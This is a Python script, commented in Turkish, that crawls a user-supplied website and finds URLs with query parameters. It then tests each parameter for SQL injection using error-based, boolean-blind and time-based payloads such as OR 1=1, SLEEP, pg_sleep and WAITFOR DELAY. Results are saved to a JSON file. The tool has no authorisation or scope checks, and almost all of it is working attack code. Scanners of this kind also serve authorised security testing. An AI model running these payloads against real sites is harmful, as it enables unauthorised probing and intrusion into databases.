# combined_sqli_crawler_scanner.py

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import json
import time

# --- Payload Listeleri (SQLi Türlerine Göre) ---
error_based_payloads = [
    "'", "''", "\"", "\\", "`", "``",
    "1' OR '1'='1", "1' OR '1'='1' -- ", "1' OR '1'='1' #", "1' OR 1=1 -- ", "1 OR 1=1",
    "1' AND 1=CONVERT(int, @@version) -- "
]

boolean_based_payloads = {
    'true': "' AND '1'='1",
    'false': "' AND '1'='2"
}

time_based_payloads = [
    "' AND SLEEP(5) -- ",
    "' AND pg_sleep(5) -- ",
    "' WAITFOR DELAY '0:0:5' -- "
]

# --- Crawler Fonksiyonu ---
def crawl_for_sqli(start_url, max_pages=30):
    visited = set()
    queue = [start_url]
    sqli_candidates = set()
    page_count = 0

    while queue and page_count < max_pages:
        current_url = queue.pop(0)
        if current_url in visited:
            continue

        print(f"[{page_count+1}] Ziyaret ediliyor: {current_url}")
        try:
            response = requests.get(current_url, timeout=5)
            if response.status_code != 200:
                print(f"\u274c Hata: {current_url}")
                continue
        except Exception as e:
            print(f"\u26a0\ufe0f İstek hatası: {e}")
            continue

        soup = BeautifulSoup(response.text, "html.parser")

        if "?" in current_url and "=" in current_url:
            sqli_candidates.add(current_url)
            print(f"🔍 SQLi adayı bulundu: {current_url}")

        for link in soup.find_all("a"):
            href = link.get("href")
            if href:
                full_url = urljoin(current_url, href)
                if full_url.startswith(start_url) and full_url not in visited:
                    queue.append(full_url)

        visited.add(current_url)
        page_count += 1
        time.sleep(1)

    return list(sqli_candidates)

# --- SQL Injection Test Fonksiyonları ---
def test_error_based(session, url, params, method='GET'):
    vulnerable = False
    original_param_values = params.copy()

    for param_name, param_value in original_param_values.items():
        for payload in error_based_payloads:
            test_params = original_param_values.copy()
            test_params[param_name] = str(param_value) + payload
            try:
                if method.upper() == 'GET':
                    parts = urlparse(url)
                    query = urlencode(test_params)
                    test_url = urlunparse(parts._replace(query=query))
                    response = session.get(test_url, timeout=10)
                else:
                    response = session.post(url, data=test_params, timeout=10)

                sql_errors = ["SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB", "error in your SQL", "Warning: mysql_"]
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        print(f"[!!!] Error-Based SQL Injection bulundu: {url} -> {param_name}")
                        return True
            except requests.exceptions.RequestException:
                continue
    return vulnerable

def test_boolean_based(session, url, params, method='GET'):
    vulnerable = False
    original_param_values = params.copy()

    for param_name, param_value in original_param_values.items():
        try:
            if method.upper() == 'GET':
                original_response = session.get(url, params=original_param_values, timeout=10)
            else:
                original_response = session.post(url, data=original_param_values, timeout=10)
            original_len = len(original_response.text)

            true_params = original_param_values.copy()
            true_params[param_name] = str(param_value) + boolean_based_payloads['true']
            false_params = original_param_values.copy()
            false_params[param_name] = str(param_value) + boolean_based_payloads['false']

            if method.upper() == 'GET':
                true_response = session.get(url, params=true_params, timeout=10)
                false_response = session.get(url, params=false_params, timeout=10)
            else:
                true_response = session.post(url, data=true_params, timeout=10)
                false_response = session.post(url, data=false_params, timeout=10)

            true_len = len(true_response.text)
            false_len = len(false_response.text)

            if true_len == original_len and false_len != original_len:
                print(f"[!!!] Boolean-Based SQL Injection bulundu: {url} -> {param_name}")
                return True

        except requests.exceptions.RequestException:
            continue
    return vulnerable

def test_time_based(session, url, params, method='GET', delay=5):
    vulnerable = False
    original_param_values = params.copy()

    for param_name, param_value in original_param_values.items():
        for payload_template in time_based_payloads:
            payload = str(param_value) + payload_template.replace("5", str(delay))
            test_params = original_param_values.copy()
            test_params[param_name] = payload
            try:
                start = time.time()
                if method.upper() == 'GET':
                    parts = urlparse(url)
                    query = urlencode(test_params)
                    test_url = urlunparse(parts._replace(query=query))
                    session.get(test_url, timeout=delay+5)
                else:
                    session.post(url, data=test_params, timeout=delay+5)
                elapsed = time.time() - start
                if elapsed >= delay:
                    print(f"[!!!] Time-Based SQL Injection bulundu: {url} -> {param_name}")
                    return True
            except requests.exceptions.Timeout:
                print(f"[!!!] Time-Based SQL Injection bulundu (Timeout): {url} -> {param_name}")
                return True
            except requests.exceptions.RequestException:
                continue
    return vulnerable

# --- Ana Fonksiyon ---
def main():
    start_url = input("🔍 Başlangıç URL'si girin (https://...): ")
    max_pages = int(input("🔢 En fazla kaç sayfa taransın?: "))

    sqli_urls = crawl_for_sqli(start_url, max_pages)

    session = requests.Session()
    session.headers.update({'User-Agent': 'MySqliTesterBot/1.0'})

    results = []

    for url in sqli_urls:
        print(f"\n[*] SQL Injection test ediliyor: {url}")
        parsed = urlparse(url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        base_url = urlunparse(parsed._replace(query=''))

        vulnerable = False

        if test_error_based(session, base_url, params):
            results.append({'url': url, 'type': 'Error-Based', 'status': 'Vulnerable'})
            vulnerable = True

        if not vulnerable and test_boolean_based(session, base_url, params):
            results.append({'url': url, 'type': 'Boolean-Based Blind', 'status': 'Vulnerable'})
            vulnerable = True

        if not vulnerable and test_time_based(session, base_url, params, delay=5):
            results.append({'url': url, 'type': 'Time-Based Blind', 'status': 'Vulnerable'})
            vulnerable = True

        if not vulnerable:
            results.append({'url': url, 'status': 'Not Vulnerable'})

    with open('scan_results.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=4, ensure_ascii=False)

    print("\n✅ Taramalar tamamlandı. Sonuçlar 'scan_results.json' dosyasına kaydedildi.")

if __name__ == "__main__":
    main()

